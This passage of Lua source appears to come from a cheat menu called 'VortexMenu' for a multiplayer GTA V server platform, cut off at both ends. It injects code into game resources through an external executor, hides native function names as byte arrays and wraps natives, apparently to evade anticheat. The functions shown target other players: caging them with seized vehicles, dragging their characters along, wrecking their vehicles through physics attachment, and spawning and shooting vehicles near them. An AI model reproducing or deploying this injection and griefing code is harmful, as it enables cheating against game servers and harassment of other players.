                local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                setCurrentWeapon(localPlayerPed, pistolHash, true)

                wait(1000)

                local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                if not createVehicle then return end
                local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2}
                local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                if not vehicle or vehicle == 0 then
                    return
                end

                if setMissionEntity then
                    setMissionEntity(vehicle, true, true)
                end
                if setEntityHealth then
                    setEntityHealth(vehicle, 10)
                end

                for i = 1, 60 do
                    local vehicleCoords = getEntityCoords(vehicle)
                    shootBullet(
                        targetPos.x, targetPos.y, targetPos.z + 1.0,
                        vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3,
                        2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0
                    )
                    wait(1)
                end

                removeWeapon(localPlayerPed, pistolHash)
            ]], targetServerId)

            Susano.InjectResource("any", injectionCode)
        end
    end,

    cageplayer = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityRotation", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then
                    return
                end

                CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local vehicles = {}
            local searchRadius = 150.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end

                success, veh = FindNextVehicle(vehHandle)
            until not success

            EndFindVehicle(vehHandle)

            if #vehicles < 4 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle, vehicles[4].handle}
            local fifthVehicle = nil
            if #vehicles >= 5 then
                fifthVehicle = vehicles[5].handle
            end

                    local function takeControl(veh)
                        SetPedIntoVehicle(playerPed, veh, -1)
                        Wait(150)

                        SetEntityAsMissionEntity(veh, true, true)
                        if NetworkGetEntityIsNetworked(veh) then
                            NetworkRequestControlOfEntity(veh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                NetworkRequestControlOfEntity(veh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end

                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Wait(100)
                    end

                    for i = 1, 4 do
                        if DoesEntityExist(selectedVehicles[i]) then
                            takeControl(selectedVehicles[i])
                        end
                    end

                    if fifthVehicle and DoesEntityExist(fifthVehicle) then
                        takeControl(fifthVehicle)
                    end

                    local targetCoords = GetEntityCoords(targetPed)
                    local cageRadius = 1.2
                    local positions = {
                        {x = targetCoords.x + cageRadius, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 90.0},
                        {x = targetCoords.x - cageRadius, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = -90.0},
                        {x = targetCoords.x, y = targetCoords.y + cageRadius, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                        {x = targetCoords.x, y = targetCoords.y - cageRadius, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 180.0},
                    }

                    for i = 1, 4 do
                        if DoesEntityExist(selectedVehicles[i]) then
                            local pos = positions[i]
                            SetEntityCoordsNoOffset(selectedVehicles[i], pos.x, pos.y, pos.z, false, false, false)
                            SetEntityRotation(selectedVehicles[i], pos.rotX, pos.rotY, pos.rotZ, 2, true)
                            FreezeEntityPosition(selectedVehicles[i], true)
                        end
                    end

                    if fifthVehicle and DoesEntityExist(fifthVehicle) then
                        SetEntityCoordsNoOffset(fifthVehicle, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, false, false, false)
                        SetEntityRotation(fifthVehicle, 0.0, 0.0, 0.0, 2, true)
                        FreezeEntityPosition(fifthVehicle, true)
                    end
                end)
            ]], targetServerId))
        else
        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local vehicles = {}
            local searchRadius = 150.0
            local vehHandle, veh = FindFirstVehicle()
            local success

            repeat
                local vehCoords = GetEntityCoords(veh)
                local distance = #(myCoords - vehCoords)
                local vehClass = GetVehicleClass(veh)
                if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 then
                    table.insert(vehicles, {handle = veh, distance = distance})
                end

                success, veh = FindNextVehicle(vehHandle)
            until not success

            EndFindVehicle(vehHandle)

            if #vehicles < 4 then
                return
            end

            table.sort(vehicles, function(a, b) return a.distance < b.distance end)
            local selectedVehicles = {vehicles[1].handle, vehicles[2].handle, vehicles[3].handle, vehicles[4].handle}
            local fifthVehicle = nil
            if #vehicles >= 5 then
                fifthVehicle = vehicles[5].handle
            end

            local function takeControl(veh)
                SetPedIntoVehicle(playerPed, veh, -1)
                Citizen.Wait(150)

                SetEntityAsMissionEntity(veh, true, true)
                if NetworkGetEntityIsNetworked(veh) then
                    NetworkRequestControlOfEntity(veh)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                        NetworkRequestControlOfEntity(veh)
                        Citizen.Wait(10)
                        timeout = timeout + 1
                    end
                end

                SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                SetEntityHeading(playerPed, myHeading)
                Citizen.Wait(100)
            end

            for i = 1, 4 do
                if DoesEntityExist(selectedVehicles[i]) then
                    takeControl(selectedVehicles[i])
                end
            end

            if fifthVehicle and DoesEntityExist(fifthVehicle) then
                takeControl(fifthVehicle)
            end

            local targetCoords = GetEntityCoords(targetPed)
            local cageRadius = 1.2
            local positions = {
                {x = targetCoords.x + cageRadius, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 90.0},
                {x = targetCoords.x - cageRadius, y = targetCoords.y, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = -90.0},
                {x = targetCoords.x, y = targetCoords.y + cageRadius, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 0.0},
                {x = targetCoords.x, y = targetCoords.y - cageRadius, z = targetCoords.z, rotX = 90.0, rotY = 0.0, rotZ = 180.0},
            }

            for i = 1, 4 do
                if DoesEntityExist(selectedVehicles[i]) then
                    local pos = positions[i]
                    SetEntityCoordsNoOffset(selectedVehicles[i], pos.x, pos.y, pos.z, false, false, false)
                    SetEntityRotation(selectedVehicles[i], pos.rotX, pos.rotY, pos.rotZ, 2, true)
                    FreezeEntityPosition(selectedVehicles[i], true)
                end
            end

            if fifthVehicle and DoesEntityExist(fifthVehicle) then
                SetEntityCoordsNoOffset(fifthVehicle, targetCoords.x, targetCoords.y, targetCoords.z + 2.0, false, false, false)
                SetEntityRotation(fifthVehicle, 0.0, 0.0, 0.0, 2, true)
                FreezeEntityPosition(fifthVehicle, true)
            end
        end)
        end
    end,

    attachplayer = function()
        local currentState = rawget(_G, 'attach_player_active') or false

        if currentState then
            rawset(_G, 'attach_player_active', false)
            rawset(_G, 'attach_player_target', nil)
            return
        end

        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityForwardVector", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                if not _G.attach_player_active then
                    _G.attach_player_active = false
                end
                if not _G.attach_player_target then
                    _G.attach_player_target = nil
                end

                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                local targetPed = GetPlayerPed(targetPlayerId)
                if not DoesEntityExist(targetPed) then
                    return
                end

                _G.attach_player_active = true
                _G.attach_player_target = targetPlayerId

                CreateThread(function()
                    while _G.attach_player_active do
                        Wait(0)

                        local targetPlayerId = _G.attach_player_target
                        if not targetPlayerId then
                            _G.attach_player_active = false
                            break
                        end

                        local myPed = PlayerPedId()
                        local targetPed = GetPlayerPed(targetPlayerId)

                        if DoesEntityExist(targetPed) and targetPed ~= myPed then
                            local myCoords = GetEntityCoords(myPed)
                            local myHeading = GetEntityHeading(myPed)
                            local forwardVector = GetEntityForwardVector(myPed)

                            local offsetX = forwardVector.x * 1.0
                            local offsetY = forwardVector.y * 1.0
                            SetEntityCoordsNoOffset(targetPed, myCoords.x + offsetX, myCoords.y + offsetY, myCoords.z, false, false, false)
                            SetEntityHeading(targetPed, myHeading)
                        else
                            _G.attach_player_active = false
                            _G.attach_player_target = nil
                            break
                        end
                    end
                end)
            ]], targetServerId))
        else
        rawset(_G, 'attach_player_active', true)
        rawset(_G, 'attach_player_target', targetPlayerId)

        Citizen.CreateThread(function()
            while rawget(_G, 'attach_player_active') do
                Citizen.Wait(0)

                local targetPlayerId = rawget(_G, 'attach_player_target')
                if not targetPlayerId then
                    rawset(_G, 'attach_player_active', false)
                    break
                end

                local myPed = PlayerPedId()
                local targetPed = GetPlayerPed(targetPlayerId)

                if DoesEntityExist(targetPed) and targetPed ~= myPed then
                    local myCoords = GetEntityCoords(myPed)
                    local myHeading = GetEntityHeading(myPed)
                    local forwardVector = GetEntityForwardVector(myPed)

                    local offsetX = forwardVector.x * 1.0
                    local offsetY = forwardVector.y * 1.0
                    SetEntityCoordsNoOffset(targetPed, myCoords.x + offsetX, myCoords.y + offsetY, myCoords.z, false, false, false)
                    SetEntityHeading(targetPed, myHeading)
                else
                    rawset(_G, 'attach_player_active', false)
                    rawset(_G, 'attach_player_target', nil)
                    break
                end
            end
        end)
        end

    end,


    bugvehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetServerId = VortexMenu.selectedPlayer
        local bugVehicleMode = VortexMenu.bugVehicleMode or "v1"

        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamActive", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityModel", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestModel", function(originalFn, ...) return originalFn(...) end)
                hNative("HasModelLoaded", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("CreatePed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetBlockingOfNonTemporaryEvents", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityLocallyInvisible", function(originalFn, ...) return originalFn(...) end)
                hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("DetachEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("AttachEntityToEntityPhysically", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetModelAsNoLongerNeeded", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityNoCollisionEntity", function(originalFn, ...) return originalFn(...) end)

                local targetServerId = %d
                local bugVehicleMode = "%s"

                if bugVehicleMode == "v1" then
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end

                    if not targetPlayerId then
                        return
                    end

                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then
                        return
                    end

                    if not IsPedInAnyVehicle(targetPed, false) then
                        return
                    end

                    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                    if not DoesEntityExist(targetVehicle) then
                        return
                    end

                    CreateThread(function()
                        local playerPed = PlayerPedId()
                        local myCoords = GetEntityCoords(playerPed)
                        local myHeading = GetEntityHeading(playerPed)

                        local bugVehCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                        local camCoords = GetGameplayCamCoord()
                        local camRot = GetGameplayCamRot(2)
                        SetCamCoord(bugVehCam, camCoords.x, camCoords.y, camCoords.z)
                        SetCamRot(bugVehCam, camRot.x, camRot.y, camRot.z, 2)
                        SetCamFov(bugVehCam, GetGameplayCamFov())
                        SetCamActive(bugVehCam, true)
                        RenderScriptCams(true, false, 0, true, true)

                        local playerModel = GetEntityModel(playerPed)
                        RequestModel(playerModel)
                        local timeout = 0
                        while not HasModelLoaded(playerModel) and timeout < 50 do
                            Wait(50)
                            timeout = timeout + 1
                        end

                        local groundZ = myCoords.z
                        local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                        local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                        if hit then
                            groundZ = hitCoords.z
                        end

                        local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                        SetEntityCollision(clonePed, false, false)
                        FreezeEntityPosition(clonePed, true)
                        SetEntityInvincible(clonePed, true)
                        SetBlockingOfNonTemporaryEvents(clonePed, true)
                        SetPedCanRagdoll(clonePed, false)
                        ClonePedToTarget(playerPed, clonePed)

                        SetEntityVisible(playerPed, false, false)

                        local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)

                        if not closestVeh or closestVeh == 0 then
                            SetEntityVisible(playerPed, true, false)
                            SetCamActive(bugVehCam, false)
                            RenderScriptCams(false, false, 0, true, true)
                            DestroyCam(bugVehCam, true)
                            if DoesEntityExist(clonePed) then
                                DeleteEntity(clonePed)
                            end
                            SetModelAsNoLongerNeeded(playerModel)
                            return
                        end

                        SetPedIntoVehicle(playerPed, closestVeh, -1)
                        Wait(150)
                        SetEntityAsMissionEntity(closestVeh, true, true)
                        if NetworkGetEntityIsNetworked(closestVeh) then
                            NetworkRequestControlOfEntity(closestVeh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                                NetworkRequestControlOfEntity(closestVeh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end

                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Wait(100)

                        if not DoesEntityExist(targetVehicle) or not DoesEntityExist(closestVeh) then
                            SetEntityVisible(playerPed, true, false)
                            SetCamActive(bugVehCam, false)
                            RenderScriptCams(false, false, 0, true, true)
                            DestroyCam(bugVehCam, true)
                            if DoesEntityExist(clonePed) then
                                DeleteEntity(clonePed)
                            end
                            SetModelAsNoLongerNeeded(playerModel)
                            return
                        end

                        for i = 1, 30 do
                            if not DoesEntityExist(targetVehicle) or not DoesEntityExist(closestVeh) then
                                break
                            end
                            DetachEntity(closestVeh, true, true)
                            Wait(5)
                            AttachEntityToEntityPhysically(
                                closestVeh,
                                targetVehicle,
                                0, 0, 0,
                                2000.0, 1460.928, 1000.0,
                                10.0, 88.0, 600.0,
                                true, true, true, false, 0
                            )
                            Wait(5)
                        end

                        Wait(500)
                        SetEntityVisible(playerPed, true, false)
                        SetCamActive(bugVehCam, false)
                        RenderScriptCams(false, false, 0, true, true)
                        DestroyCam(bugVehCam, true)
                        if DoesEntityExist(clonePed) then
                            DeleteEntity(clonePed)
                        end
                        SetModelAsNoLongerNeeded(playerModel)
                    end)
                elseif bugVehicleMode == "v2" then
                    local targetPlayerId = nil
                    for _, player in ipairs(GetActivePlayers()) do
                        if GetPlayerServerId(player) == targetServerId then
                            targetPlayerId = player
                            break
                        end
                    end

                    if not targetPlayerId then
                        return
                    end

                    local targetPed = GetPlayerPed(targetPlayerId)
                    if not DoesEntityExist(targetPed) then
                        return
                    end

                    if not IsPedInAnyVehicle(targetPed, false) then
                        return
                    end

                    local targetVehicle = GetVehiclePedIsIn(targetPed, false)
                    if not DoesEntityExist(targetVehicle) then
                        return
                    end

                    CreateThread(function()
                        local playerPed = PlayerPedId()
                        local myCoords = GetEntityCoords(playerPed)
                        local myHeading = GetEntityHeading(playerPed)

                        local bugVehCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                        local camCoords = GetGameplayCamCoord()
                        local camRot = GetGameplayCamRot(2)
                        SetCamCoord(bugVehCam, camCoords.x, camCoords.y, camCoords.z)
                        SetCamRot(bugVehCam, camRot.x, camRot.y, camRot.z, 2)
                        SetCamFov(bugVehCam, GetGameplayCamFov())
                        SetCamActive(bugVehCam, true)
                        RenderScriptCams(true, false, 0, true, true)

                        local playerModel = GetEntityModel(playerPed)
                        RequestModel(playerModel)
                        local timeout = 0
                        while not HasModelLoaded(playerModel) and timeout < 50 do
                            Wait(50)
                            timeout = timeout + 1
                        end

                        local groundZ = myCoords.z
                        local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                        local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                        if hit then
                            groundZ = hitCoords.z
                        end

                        local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                        SetEntityCollision(clonePed, false, false)
                        FreezeEntityPosition(clonePed, true)
                        SetEntityInvincible(clonePed, true)
                        SetBlockingOfNonTemporaryEvents(clonePed, true)
                        SetPedCanRagdoll(clonePed, false)
                        ClonePedToTarget(playerPed, clonePed)

                        SetEntityVisible(playerPed, false, false)

                        local vehicles = {}
                        local searchRadius = 100.0
                        local vehHandle, veh = FindFirstVehicle()
                        local success

                        repeat
                            if veh ~= targetVehicle and DoesEntityExist(veh) then
                                local vehCoords = GetEntityCoords(veh)
                                local distance = #(myCoords - vehCoords)
                                local vehClass = GetVehicleClass(veh)
                                if distance <= searchRadius and vehClass ~= 8 and vehClass ~= 13 then
                                    table.insert(vehicles, {handle = veh, distance = distance})
                                end
                            end
                            success, veh = FindNextVehicle(vehHandle)
                        until not success
                        EndFindVehicle(vehHandle)

                        if #vehicles < 2 then
                            SetEntityVisible(playerPed, true, false)
                            SetCamActive(bugVehCam, false)
                            RenderScriptCams(false, false, 0, true, true)
                            DestroyCam(bugVehCam, true)
                            if DoesEntityExist(clonePed) then
                                DeleteEntity(clonePed)
                            end
                            SetModelAsNoLongerNeeded(playerModel)
                            return
                        end

                        table.sort(vehicles, function(a, b) return a.distance < b.distance end)
                        local firstVeh = vehicles[1].handle
                        local secondVeh = vehicles[2].handle

                        SetPedIntoVehicle(playerPed, firstVeh, -1)
                        Wait(150)
                        SetEntityAsMissionEntity(firstVeh, true, true)
                        if NetworkGetEntityIsNetworked(firstVeh) then
                            NetworkRequestControlOfEntity(firstVeh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(firstVeh) and timeout < 50 do
                                NetworkRequestControlOfEntity(firstVeh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end

                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Wait(100)

                        SetPedIntoVehicle(playerPed, secondVeh, -1)
                        Wait(150)
                        SetEntityAsMissionEntity(secondVeh, true, true)
                        if NetworkGetEntityIsNetworked(secondVeh) then
                            NetworkRequestControlOfEntity(secondVeh)
                            local timeout = 0
                            while not NetworkHasControlOfEntity(secondVeh) and timeout < 50 do
                                NetworkRequestControlOfEntity(secondVeh)
                                Wait(10)
                                timeout = timeout + 1
                            end
                        end

                        SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                        SetEntityHeading(playerPed, myHeading)
                        Wait(100)

                        if not DoesEntityExist(targetVehicle) or not DoesEntityExist(secondVeh) then
                            SetEntityVisible(playerPed, true, false)
                            SetCamActive(bugVehCam, false)
                            RenderScriptCams(false, false, 0, true, true)
                            DestroyCam(bugVehCam, true)
                            if DoesEntityExist(clonePed) then
                                DeleteEntity(clonePed)
                            end
                            SetModelAsNoLongerNeeded(playerModel)
                            return
                        end

                        SetEntityNoCollisionEntity(secondVeh, targetVehicle, true)
                        SetEntityNoCollisionEntity(targetVehicle, secondVeh, true)

                        for i = 1, 30 do
                            if not DoesEntityExist(targetVehicle) or not DoesEntityExist(secondVeh) then
                                break
                            end
                            DetachEntity(secondVeh, true, true)
                            Wait(5)
                            AttachEntityToEntityPhysically(
                                secondVeh,
                                targetVehicle,
                                0, 0, 0,
                                2000.0, 1460.928, 1000.0,
                                10.0, 88.0, 600.0,
                                true, true, true, false, 0
                            )
                            Wait(5)
                        end

                        Wait(500)
                        SetEntityVisible(playerPed, true, false)
                        SetCamActive(bugVehCam, false)
                        RenderScriptCams(false, false, 0, true, true)
                        DestroyCam(bugVehCam, true)
                        if DoesEntityExist(clonePed) then
                            DeleteEntity(clonePed)
                        end
                        SetModelAsNoLongerNeeded(playerModel)
                    end)
                end
            ]], targetServerId, bugVehicleMode))
        else
        if VortexMenu.bugVehicleMode == "v1" then
            if not VortexMenu.selectedPlayer then
                return
            end

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then
                return
            end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then
                return
            end

            if not IsPedInAnyVehicle(targetPed, false) then
                return
            end

            local targetVehicle = GetVehiclePedIsIn(targetPed, false)
            if not DoesEntityExist(targetVehicle) then
                return
            end

        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local bugVehCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            SetCamCoord(bugVehCam, camCoords.x, camCoords.y, camCoords.z)
            SetCamRot(bugVehCam, camRot.x, camRot.y, camRot.z, 2)
            SetCamFov(bugVehCam, GetGameplayCamFov())
            SetCamActive(bugVehCam, true)
            RenderScriptCams(true, false, 0, true, true)

            local playerModel = GetEntityModel(playerPed)
